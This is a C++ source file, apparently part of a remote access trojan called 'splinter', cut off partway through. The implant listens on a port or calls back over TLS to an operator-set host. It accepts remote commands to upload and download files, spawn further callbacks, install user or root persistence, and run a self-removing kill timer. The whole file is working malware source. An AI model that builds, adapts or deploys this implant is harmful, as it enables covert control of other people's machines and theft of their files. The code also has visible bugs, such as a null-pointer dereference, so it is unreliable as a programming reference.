#include <cstdio>
#include <cstdlib>
#include <iomanip>
#include <fstream>
#include <unistd.h>
#include <errno.h>
#include <cstring>
#include <strings.h>
#include <pwd.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <setjmp.h>
#include <signal.h>
#include <poll.h>
#include <ifaddrs.h>
#include <ctime>

#include <chrono>
#include <mutex>
#include <sstream>
#include <string>
#include <thread>
#include <tuple>
#include <vector>

#ifdef __APPLE__
#include <mach-o/dyld.h>
#endif

#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/certs.h"
#include "mbedtls/x509.h"
#include "mbedtls/ssl.h"
#include "mbedtls/net.h"
#include "mbedtls/error.h"
#include "mbedtls/debug.h"
#include "mbedtls/ssl_internal.h"
#include "mbedtls/sha256.h"

#include "persistence.h"
#include "proc.h"
#include "rat_server.h"
#include "splinter_help.h"
#include "../keys/local_ssl_certificate.h"
#include "../keys/local_ssl_keypair.h"

unsigned long timeout = 5;

std::vector<std::thread> pool;
std::vector<std::tuple<std::string, std::string, long>> callback_list;
std::mutex callback_mutex, kill_timer_mutex;

static __thread jmp_buf env_alrm;
static void sigalrm_handler(int signo)
{
    (void)signo;
    /* restore env */
    longjmp(env_alrm, 5);
}

size_t fread_timeout(void *ptr, size_t size, size_t nitems, FILE *stream, int timeout)
{
    size_t read_count = 0;

    /* set long jump */
    int val = setjmp(env_alrm);
    if (!val) {
    /* setup signal handler */
        if (signal(SIGALRM, &sigalrm_handler) == SIG_ERR)
            return (0);

        /* setup alarm */
        alarm(timeout);

        /* read */
        read_count = fread(ptr, size, nitems, stream);
    } else
        errno = EINTR;

    /* unset signal handler and alarm */
    signal(SIGALRM, NULL);
    alarm(0);

    /* return */
    return (read_count);
}

void set_kill_timer(std::time_t timestamp)
{
    char *homedir;
    if ((homedir = getenv("HOME")) == NULL)
    {
        homedir = getpwuid(getuid())->pw_dir;
    }

    std::string filepath(homedir);
    filepath += "/.splinter";

    std::lock_guard<std::mutex> guard(kill_timer_mutex);
    std::fstream file;
    file.open(filepath, std::ios::out);
    file << timestamp;
    file.close();
}

std::time_t get_kill_timer()
{
    char *homedir;
    if ((homedir = getenv("HOME")) == NULL)
    {
        homedir = getpwuid(getuid())->pw_dir;
    }

    std::string filepath(homedir);
    filepath += "/.splinter";
    std::time_t timestamp;
    
    printf("Filepath: %s\n", filepath.c_str());
    //std::cout << "Filepath: " << filepath << std::endl;

    std::lock_guard<std::mutex> guard(kill_timer_mutex);
    std::fstream file;
    file.open(filepath, std::ios::in);
    file >> timestamp;
    file.close();

    return timestamp;
}

int launch_rat(std::string callback_ip, std::string callback_port, long callback_timeout = 0);
int launch_rat_callback(std::string callback_ip, std::string callback_port, long callback_timeout = 0)
{
    // check if ip:port combination already exists
    std::lock_guard<std::mutex> guard(callback_mutex);
    for (auto &config : callback_list)
    {
        if (std::get<0>(config) == callback_ip && std::get<1>(config) == callback_port)
        {
            // there is already a callback for this ip:port
            return -1;
        }
    }
    pool.push_back(std::thread (launch_rat, callback_ip, callback_port, callback_timeout));
    callback_list.push_back(std::make_tuple(callback_ip, callback_port, callback_timeout));
    return 0;
}

std::string list_callbacks()
{
    std::stringstream ss;
    std::lock_guard<std::mutex> guard(callback_mutex);
    for (unsigned int i = 0; i < callback_list.size(); ++i)
    {
        ss << std::get<0>(callback_list[i]) << ":" << std::get<1>(callback_list[i]) << " @ " << std::get<2>(callback_list[i]) << "\n";
    }
    return ss.str();
}

void stop_callbacks()
{
    std::lock_guard<std::mutex> guard(callback_mutex);
    for (unsigned int i = 0; i < callback_list.size(); ++i)
    {
        std::get<2>(callback_list[i]) = -1;
    }
}

void cleanup_rat_callback(std::string callback_ip, std::string callback_port)
{
    std::lock_guard<std::mutex> guard(callback_mutex);
    for (unsigned int i = 0; i < callback_list.size(); ++i)
    {
        if (std::get<0>(callback_list[i]) == callback_ip && std::get<1>(callback_list[i]) == callback_port)
        {
            // there is already a callback for this ip:port
            callback_list.erase(callback_list.begin() + i);
            break;
        }
    }
}

void handle_kill_timer()
{
    std::time_t kill_timer = get_kill_timer();
    std::time_t now = std::time(nullptr);

    while (now < kill_timer)
    {
        std::this_thread::sleep_for(std::chrono::seconds(10));
        kill_timer = get_kill_timer();
        now = std::time(nullptr);
    }

    char path[PATH_MAX + 1];
    memset(path, 0, PATH_MAX + 1);

    #ifdef __APPLE__
    uint32_t size = PATH_MAX;
    _NSGetExecutablePath(path, &size);
    #else
    readlink("/proc/self/exe", path, PATH_MAX);
    #endif

    unsigned int persist = isPersistent(path);
    switch (persist)
    {
        case 1:
            removePersistence(path, User);
            break;
        case 2:
            removePersistence(path, System);
            break;
        case 3:
            removePersistence(path, User);
            removePersistence(path, System);
            break;
        default:
            break;
    }
    stop_callbacks();
    raise(9);
}

int main(int argc, char** argv)
{
    std::string callback_ip = "", callback_port = "";
    std::thread kill_handler(handle_kill_timer);
    int val = launch_rat(callback_ip, callback_port);

    // wait for other threads to exit
    for(auto &t : pool)
    {
        t.join();
    }
    kill_handler.detach();

    return val;
}

int launch_rat(std::string callback_ip, std::string callback_port, long callback_timeout)
{
    int i, ret;
    int had_output = 0;
    char empty_return[] = "[*] Command completed\n";
    FILE *fp;
    std::string env_host, env_port;
    char default_port[] = "12345";

    struct pollfd fds[64];
    int    nfds = 1, current_size = 0;
    struct ssl_conn *listen_conn = NULL;
    struct ssl_conn *client_conn = NULL;
    struct ssl_conn *clean_helper = NULL;
    struct compression compress;
    struct ifaddrs *ifa = NULL;
    struct ifaddrs *tmp = NULL;
    struct sockaddr_in *pAddr = NULL;

    //mbedtls
    mbedtls_entropy_context entropy;
    mbedtls_ctr_drbg_context ctr_drbg;
    mbedtls_ssl_config conf;
    mbedtls_x509_crt srvcert;
    mbedtls_pk_context pkey;
    mbedtls_x509_crt_init( &srvcert );
    mbedtls_pk_init( &pkey );
    mbedtls_entropy_init( &entropy );
    mbedtls_ctr_drbg_init( &ctr_drbg );
    mbedtls_ssl_config_init( &conf );

    if (callback_ip == "")
    {
        char *tmp = getenv("I");
        if (tmp != NULL)
            env_host = std::string(tmp);
    }
    else
        env_host = callback_ip;
    if (callback_port == "")
    {
        char *tmp = getenv("P");
        if (tmp != NULL)
            env_port = std::string(tmp);
    }
    else
        env_port = callback_port;
    
    unsigned char isKill = 0;

restart:

    if (env_port == "")
    {
        env_port = default_port;
    }

    listen_conn = (ssl_conn*)malloc (sizeof(struct ssl_conn));
    memset(listen_conn, 0, sizeof(struct ssl_conn));

    mbedtls_net_init( &listen_conn->conn_fd );
    mbedtls_ssl_init( &listen_conn->ssl_fd );
    #ifdef DEBUG
    printf("Host: %s\n", env_host.c_str());
    #endif

    //ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_srv_crt, mbedtls_test_srv_crt_len );
    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) ssl_certificate_pem, ssl_certificate_pem_len + 1);
    if( ret != 0 ) {
        #ifdef DEBUG
        printf( " failed\n  !  mbedtls_x509_crt_parse returned %d\n\n", ret );
        #endif
        return 1;
    }

    //ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_cas_pem, mbedtls_test_cas_pem_len );
    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) ssl_certificate_pem, ssl_certificate_pem_len + 1);
    if( ret != 0 ) {
        #ifdef DEBUG
        printf( " failed\n  !  mbedtls_x509_crt_parse returned %d\n\n", ret );
        #endif
        return 2;
    }

    //ret =  mbedtls_pk_parse_key( &pkey, (const unsigned char *) mbedtls_test_srv_key, mbedtls_test_srv_key_len, NULL, 0 );
    ret =  mbedtls_pk_parse_key( &pkey, (const unsigned char *) ssl_keypair_key, ssl_keypair_key_len + 1, NULL, 0 );
    if( ret != 0 ) {
        #ifdef DEBUG
        printf( " failed\n  !  mbedtls_pk_parse_key returned %d\n\n", ret );
        #endif
        return 3;
    }

    #ifdef DEBUG
    printf( "  . Seeding the random number generator..." );
    fflush( stdout );
    #endif
    mbedtls_entropy_init(&entropy);
    if( ( ret = mbedtls_ctr_drbg_seed( &ctr_drbg, mbedtls_entropy_func, &entropy, NULL, 256 ) ) != 0 ) {
        #ifdef DEBUG
        printf( " failed\n  ! mbedtls_ctr_drbg_seed returned %d\n", ret );
        #endif
        return 5;
    }
    #ifdef DEBUG
    printf(" ok\n");

    printf( "  . Setting up the SSL data...." );
    fflush( stdout );
    #endif
    if (env_host == ""){
        if( ( ret = mbedtls_ssl_config_defaults( &conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 ) {
            #ifdef DEBUG
            printf( " failed\n  ! mbedtls_ssl_config_defaults returned %d\n\n", ret );
            #endif
            return 6;
        }
    } else {
        if( ( ret = mbedtls_ssl_config_defaults( &conf, MBEDTLS_SSL_IS_CLIENT, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 ) {
            #ifdef DEBUG
            printf( " failed\n  ! mbedtls_ssl_config_defaults returned %d\n\n", ret );
            #endif
            return 6;
        }
        mbedtls_ssl_conf_authmode( &conf, MBEDTLS_SSL_VERIFY_OPTIONAL );
    }
    mbedtls_ssl_conf_read_timeout( &conf, 500);
    #ifdef DEBUG
    printf(" ok\n");    

    printf( "  . Setting up the SSL/TLS structure..." );
    fflush( stdout );
    #endif
    mbedtls_ssl_conf_rng( &conf, mbedtls_ctr_drbg_random, &ctr_drbg );
    mbedtls_ssl_conf_ca_chain( &conf, srvcert.next, NULL );
    if( ( ret = mbedtls_ssl_conf_own_cert( &conf, &srvcert, &pkey ) ) != 0 ) {
        #ifdef DEBUG
        printf( " failed\n  ! mbedtls_ssl_conf_own_cert returned %d\n\n", ret );
        #endif
        return 7;
    }
    #ifdef DEBUG
    printf( " ok\n" );
    #endif

    if (env_host == ""){
        if( ( ret = mbedtls_net_bind( &listen_conn->conn_fd, NULL, env_port.c_str(), MBEDTLS_NET_PROTO_TCP ) ) != 0 ) {
            #ifdef DEBUG
            printf( " failed\n  ! mbedtls_net_bind returned %d\n\n", ret );
            #endif
            return 4;
        }
    } else {
        if ( ( ret = mbedtls_ssl_setup( &listen_conn->ssl_fd, &conf ) ) != 0 ) {
            #ifdef DEBUG
            printf( " failed\n  ! mbedtls_ssl_setup returned %d\n\n", ret );
            #endif
            return 6;
        }

        #ifdef DEBUG
        printf("Connecting to tcp/%s/%s...\n", env_host.c_str(), env_port.c_str());
        #endif
        if ( ( ret = mbedtls_net_connect( &listen_conn->conn_fd, env_host.c_str(), env_port.c_str(), MBEDTLS_NET_PROTO_TCP ) ) != 0 ) {
            #ifdef DEBUG
            printf( " failed\n  ! mbedtls_net_connect returned %d\n\n", ret );
            #endif
            sleep(timeout);
            goto Cleanup;
            //return 4;
        }

        mbedtls_ssl_set_bio( &listen_conn->ssl_fd, &listen_conn->conn_fd, mbedtls_net_send, mbedtls_net_recv, NULL );

        #ifdef DEBUG
        printf( "  . Performing the SSL/TLS handshake..." );
        fflush( stdout );
        #endif
        while ( ( ret = mbedtls_ssl_handshake( &listen_conn->ssl_fd ) ) != 0 ) {
            if ( ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE ) {
                #ifdef DEBUG
                printf( " failed\n  ! mbedtls_ssl_handshake returned -0x%x\n\n", -ret );
                #endif
                return 8;
            }
        }
        #ifdef DEBUG
        printf( " ok\n" );
        #endif
        
         printf( "  . Verifying peer X.509 certificate..." );
        /* In real life, we probably want to bail out when ret != 0 */
        uint32_t flags;
        if( ( flags = mbedtls_ssl_get_verify_result( &listen_conn->ssl_fd ) ) != 0 && flags != MBEDTLS_X509_KU_DIGITAL_SIGNATURE) {
            char vrfy_buf[512];

            printf( " failed\n");
            mbedtls_x509_crt_verify_info( vrfy_buf, sizeof( vrfy_buf ), "  ! ", flags );
            printf( "%s\n", vrfy_buf );
            cleanup_rat_callback(callback_ip, callback_port);
            return -10;
        } else {
            printf( " ok\n" );
        }

        printf("Cipher: %s\n", mbedtls_ssl_get_ciphersuite( &listen_conn->ssl_fd ));

        getifaddrs(&ifa);
        tmp = ifa;
        pAddr = NULL;
        while (tmp) {
            if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET) {
                if (strncmp(tmp->ifa_name, "lo", 2) != 0){
                    pAddr = (struct sockaddr_in *)tmp->ifa_addr;
                }
            }
            tmp = tmp->ifa_next;
        }
        if (pAddr != NULL){
            mbedtls_ssl_write(&listen_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
        } else{
            mbedtls_ssl_write(&listen_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
        }
        freeifaddrs(ifa);
    }

    memset(fds, -1, sizeof(fds));

    /*************************************************************/
    /* Set up the initial listening socket                        */
    /*************************************************************/
    fds[0].fd = listen_conn->conn_fd.fd;
    fds[0].events = POLLIN;
    #ifdef DEBUG
    printf( "  . Waiting for a remote connection ..." );
    fflush( stdout );
    #endif

    memset(&compress, 0, sizeof(struct compression));
    if ((compress.orig_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL){
        perror("Failed initial malloc");
    }
    memset(compress.orig_buffer, 0, BUFFER_SIZE);

    if ((compress.transformed_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL){
        perror("Failed initial malloc");
    }
    memset(compress.transformed_buffer, 0, BUFFER_SIZE);
    
    while (1) {
        ret = poll(fds, nfds, -1);
        if (ret < 0) {
            perror("  poll() failed");
            goto Cleanup;
        }
        /***********************************************************/
        /* One or more descriptors are readable.  Need to          */
        /* determine which ones they are.                          */
        /***********************************************************/
        current_size = nfds;

        //Run through the existing connection looking for data to be read
        for (i = 0; i < current_size; i++) {
            //New connection
            if (fds[i].revents & POLLIN) {
                if ((fds[i].fd == listen_conn->conn_fd.fd) && (env_host == "")) {
                    /*******************************************************/
                    /* Listening descriptor is readable.                   */
                    /*******************************************************/

                    /* Creates a node at the end of the list */
                    add_client(&listen_conn, &client_conn);

                    if( ( ret = mbedtls_net_accept( &listen_conn->conn_fd, &client_conn->conn_fd, NULL, 0, NULL ) ) != 0 ) {
                        #ifdef DEBUG
                        printf( " failed\n  ! mbedtls_net_accept returned %d\n\n", ret );
                        #endif
                        return 9;
                    } else {
                        #ifdef DEBUG
                        printf(" connected!\n");
                        #endif
                        if( ( ret = mbedtls_ctr_drbg_reseed( &ctr_drbg, NULL, 0 ) ) != 0 ) {
                            #ifdef DEBUG
                            printf( " failed\n  ! mbedtls_ctr_drbg_reseed returned %d\n", ret );
                            #endif
                            goto Cleanup;
                        }

                        if( ( ret = mbedtls_ssl_setup( &client_conn->ssl_fd, &conf ) ) != 0 ) {
                            #ifdef DEBUG
                            printf( " failed\n  ! mbedtls_ssl_setup returned %d\n\n", ret );
                            #endif
                            return 8;
                        }
                        #ifdef DEBUG
                        printf("  . mbedtls_ssl_setup ... completed\n");
                        #endif
                        mbedtls_ssl_set_bio( &client_conn->ssl_fd, &client_conn->conn_fd, mbedtls_net_send, mbedtls_net_recv, 0 );

                        //Handle new connections
                        #ifdef DEBUG
                        printf( "  . Performing the SSL/TLS handshake ..." );
                        fflush( stdout );
                        #endif

                        while( ( ret = mbedtls_ssl_handshake( &client_conn->ssl_fd ) ) != 0 ) {
                            if( ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE ) {
                                #ifdef DEBUG
                                printf( " failed\n  ! mbedtls_ssl_handshake returned 0x%x\n\n", -ret );
                                #endif
                                return 10;
                            }
                        }
                        #ifdef DEBUG
                        printf(" ok\n");
                        printf("Cipher: %s\n", mbedtls_ssl_get_ciphersuite( &client_conn->ssl_fd ));
                        #endif
                        
                        getifaddrs(&ifa);
                        tmp = ifa;
                        pAddr = NULL;
                        while (tmp) {
                            if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET) {
                                if (strncmp(tmp->ifa_name, "lo", 2) != 0){
                                    pAddr = (struct sockaddr_in *)tmp->ifa_addr;
                                }
                            }
                            tmp = tmp->ifa_next;
                        }
                        if (pAddr != NULL){
                            mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
                        } else{
                            mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
                        }
                        freeifaddrs(ifa);

                        /*****************************************************/
                        /* Add the new incoming connection to the            */
                        /* pollfd structure                                  */
                        /*****************************************************/
                        #ifdef DEBUG
                        struct sockaddr_in addr;
                        socklen_t addr_len = sizeof(addr);
                        int err = getpeername(client_conn->conn_fd.fd, (struct sockaddr *) &addr, &addr_len);
                        if (err == 0)
                            printf("[*]: New connection from %s:%d on socket %d\n", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port), client_conn->conn_fd.fd);
                        else
                            printf("[*]: New connection on socket %d\n", client_conn->conn_fd.fd);
                        #endif

                        // send kill timer data
                        memset(compress.orig_buffer, 0, BUFFER_SIZE);
                        memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                        std::string dummy = "Kill timer will trigger at ";

                        std::time_t timestamp = get_kill_timer();
                        std::tm *ptm = std::localtime(&timestamp);
                        char buffer[40];
                        std::strftime(buffer, 40, "%Y-%m-%dT%H:%M:%S", ptm);
                        dummy.append(buffer);
                        dummy.append("\n\n");

                        strncpy((char*)compress.orig_buffer, dummy.c_str(), dummy.length());
                        compress.orig_size = HELP_txt_len;
                        compress_buffer(&compress);
                        ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                        memset(compress.orig_buffer, 0, BUFFER_SIZE);
                        memset(compress.transformed_buffer, 0, BUFFER_SIZE);

                        fds[nfds].fd = client_conn->conn_fd.fd;
                        fds[nfds].events = POLLIN;
                        nfds++;
                    }
                } else {
                    //Handle data from a client
                    /*******************************************************/
                    /* Receive all incoming data on this socket            */
                    /* before we loop back and call poll again.            */
                    /*******************************************************/
                    client_conn = listen_conn->next;
                    while (client_conn != NULL) {
                        if (client_conn->conn_fd.fd == fds[i].fd) {
                            break;
                        }
                        client_conn = client_conn->next;
                    }
                    if (env_host != ""){
                        client_conn = listen_conn;
                    }

                    /*****************************************************/
                    /* Receive data on this connection until the         */
                    /* recv fails with EWOULDBLOCK. If any other         */
                    /* failure occurs, we will close the                 */
                    /* connection.                                       */
                    /*****************************************************/
                    if ((compress.orig_size = mbedtls_ssl_read(&client_conn->ssl_fd, compress.orig_buffer, BUFFER_SIZE)) <= 0){
                        #ifdef DEBUG
                        printf("nbytes: %d\n", compress.orig_size);
                        #endif
                        //Got an error or connection closed by client
                        if (compress.orig_size == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY) {
                            //Connection closed
                            #ifdef DEBUG
                            printf("%s: socket %d hung up\n", "127.0.0.1", i);
                            #endif
                            goto Cleanup;
                        }
                        if (compress.orig_size == MBEDTLS_ERR_NET_RECV_FAILED) {
                            #ifdef DEBUG
                            printf("MBEDTLS recv failed\n");
                            #endif
                            goto Cleanup;
                        }

                        if (compress.orig_size == 0) {
                            #ifdef DEBUG
                            printf("Connection closed\n");
                            #endif
                            if (env_host != ""){
                                goto Cleanup;
                            }
                            client_disconnect(&listen_conn, &fds[i], fds[i].fd, &nfds);
                            continue;
                        }
                    } else {
                        static char path[255] = "~";
                        decompress_buffer(&compress);
                        #ifdef DEBUG
                        printf("Decompressed: %s\n", compress.transformed_buffer);
                        #endif

                        printf("\nPATH: %s\n", path);

                        if (strncmp("cd ", (char*)compress.transformed_buffer, 3) == 0) 
                        {
                            //char path[255];
                            strncpy(path, (char*)compress.transformed_buffer, 254);
                            memmove(path, path+3, strlen(path));
                            //printf("\nPATH: %s\n", path);
                        }
                        if (strncmp("", (char*)compress.transformed_buffer, 1) == 0) {
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            strncpy((char*)compress.orig_buffer, empty_return, BUFFER_SIZE);
                            compress_buffer(&compress);
                            if (mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size) == -1 ) {
                                perror("Error Sending");
                            }
                            continue;
                        }
                        if (strncmp(".help", (char*)compress.transformed_buffer, 5) == 0) {
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            strncpy((char*)compress.orig_buffer, (char*)HELP_txt, HELP_txt_len);
                            compress.orig_size = HELP_txt_len;
                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            continue;
                        }
                        if (strncmp(".kill", (char*)compress.transformed_buffer, 5) == 0) {
                            #ifdef DEBUG
                            printf("Exiting...\n");
                            #endif
                            isKill = 1;
                            cleanup_rat_callback(callback_ip, callback_port);
                            goto Cleanup;
                        }

                        if (strncmp(".quit", (char*)compress.transformed_buffer, 5) == 0) {
                            #ifdef DEBUG
                            printf("Exiting...\n");
                            #endif
                            client_disconnect(&listen_conn, &fds[i], fds[i].fd, &nfds);
                            continue;
                        }

                        if (strncmp("timeout ", (char*)compress.transformed_buffer, 8) == 0){
                            //callback_to_ip((char*)compress.transformed_buffer, &client_conn);
                            char* timeout_value = (char*)compress.transformed_buffer + 8;

                            timeout = strtoul(timeout_value, NULL, 10);
                            printf("Timeout: %lu", timeout);

                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            snprintf((char*)compress.orig_buffer, BUFFER_SIZE - 1, "Timeout set to %lu\n", timeout);
                            //strncpy((char*)compress.orig_buffer, "Timeout set to ", 16);
                            //strncat((char*)compress.orig_buffer, timeout_value, strlen(timeout_value));
                            //strncat((char*)compress.orig_buffer, "\n", 2);
                            compress.orig_size = strlen((char*)compress.orig_buffer);

                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            continue;
                        }

                        if (strncmp("upload ", (char*)compress.transformed_buffer, 7) == 0) {
                            strncpy((char*)compress.orig_buffer, (char*)compress.transformed_buffer, BUFFER_SIZE);
                            upload_file(&compress, client_conn);
                            continue;
                        }

                        if (strncmp("kill_timer set", (char*)compress.transformed_buffer, 14) == 0) {
                            char* command_original = (char*)malloc(BUFFER_SIZE);
                            strncpy(command_original, (char*)compress.transformed_buffer, BUFFER_SIZE);
                            strsep(&command_original, " ");
                            strsep(&command_original, " ");
                            char *timestamp = strsep(&command_original, " ");
                            std::stringstream tstamp;
                            tstamp << timestamp;

                            const std::string date_format {"%Y-%m-%dT%H:%M:%S"};
                            std::tm dt;
                            tstamp >> std::get_time(&dt, date_format.c_str());
                            std::time_t unix_timestamp = std::mktime(&dt);
                            set_kill_timer(unix_timestamp);

                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            std::stringstream ss;
                            ss << "Kill timer set to " << unix_timestamp << " since epoch.";
                            std::string status = ss.str();
                            snprintf((char*)compress.orig_buffer, BUFFER_SIZE - 1, status.c_str());
                            compress.orig_size = status.length();

                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            free (command_original);
                            continue;
                        }

                        if (strncmp("kill_timer status", (char*)compress.transformed_buffer, 17) == 0) {
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);

                            std::time_t timestamp = get_kill_timer();
                            std::tm *ptm = std::localtime(&timestamp);
                            char buffer[40];
                            std::strftime(buffer, 40, "%Y-%m-%dT%H:%M:%S", ptm);
                            std::string status(buffer);
                            snprintf((char*)compress.orig_buffer, BUFFER_SIZE - 1, status.c_str());
                            compress.orig_size = status.length();
                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            continue;
                        }

                        if (strncmp("download ", (char*)compress.transformed_buffer, 9) == 0) {
                            strncpy((char*)compress.orig_buffer, (char*)compress.transformed_buffer, BUFFER_SIZE);
                            download_file(&compress, client_conn);
                            continue;
                        }
                        if (strncmp("callback status", (char*)compress.transformed_buffer, 15) == 0) {
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            std::string status = list_callbacks();
                            snprintf((char*)compress.orig_buffer, BUFFER_SIZE - 1, status.c_str());
                            compress.orig_size = status.length();
                            printf("Callback status\n\n%s\n", (char*)compress.orig_buffer);
                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            continue;
                        }
                        if (strncmp("callback stop", (char*)compress.transformed_buffer, 13) == 0) {
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            stop_callbacks();
                            strncpy((char*)compress.orig_buffer, empty_return, BUFFER_SIZE);
                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            continue;
                        }
                        if (strncmp("callback ", (char*)compress.transformed_buffer, 9) == 0) {
                            char* command_original = (char*)malloc(BUFFER_SIZE);
                            strncpy(command_original, (char*)compress.transformed_buffer, BUFFER_SIZE);
                            strsep(&command_original, " ");
                            char* remote_ip = strsep(&command_original, " ");
                            char* remote_port = strsep(&command_original, " ");
                            char* remote_timeout = strsep(&command_original, " ");
                            char *end;
                            long _timeout = 0;
                            if (remote_timeout != NULL)
                                _timeout = strtol(remote_timeout, &end, 10);
                            if (remote_timeout == end)
                                _timeout = 0;

                            std::string _ip(remote_ip), _port(remote_port);
                            int error = launch_rat_callback(_ip, _port, _timeout);
                            #ifdef DEBUG
                            printf("Callback installed for %s:%s @ %ld\n", remote_ip, remote_port, _timeout);
                            #endif

                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);

                            if (!error)
                                strncpy((char*)compress.orig_buffer, empty_return, BUFFER_SIZE);
                            else
                                snprintf((char*)compress.orig_buffer, BUFFER_SIZE - 1, "Callback already exists.");
                            compress_buffer(&compress);
                            if (mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size) == -1 ) {
                                perror("Error Sending");
                            }
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            free (command_original);
                            continue;
                        }
                        if (strncmp("install status", (char*)compress.transformed_buffer, 14) == 0) {
                            // return persistence status

                            char path[PATH_MAX + 1];
                            memset(path, 0, PATH_MAX + 1);

                            #ifdef __APPLE__
                            uint32_t size = PATH_MAX;
                            _NSGetExecutablePath(path, &size);
                            #else
                            readlink("/proc/self/exe", path, PATH_MAX);
                            #endif

                            unsigned int persist = isPersistent(path);

                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);

                            if (persist == 0)
                            {
                                strncpy((char*)compress.orig_buffer, "Not installed", 14);
                                compress.orig_size = 14;
                            }
                            else if (persist == 1)
                            {
                                strncpy((char*)compress.orig_buffer, "Installed as user", 18);
                                compress.orig_size = 18;
                            }
                            else if (persist == 2)
                            {
                                strncpy((char*)compress.orig_buffer, "Installed as system", 20);
                                compress.orig_size = 20;
                            }
                            else if (persist == 3)
                            {
                                strncpy((char*)compress.orig_buffer, "Installed as user and system", 29);
                                compress.orig_size = 29;
                            }

                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            continue;
                        }
                        if (strncmp("install system", (char*)compress.transformed_buffer, 14) == 0) {
                            // install root persistence
                            char path[PATH_MAX + 1];
                            memset(path, 0, PATH_MAX + 1);

                            #ifdef __APPLE__
                            uint32_t size = PATH_MAX;
                            _NSGetExecutablePath(path, &size);
                            #else
                            readlink("/proc/self/exe", path, PATH_MAX);
                            #endif

                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);

                            if (isPersistent(path) == 0)
                            {
                                installPersistence(path, System);

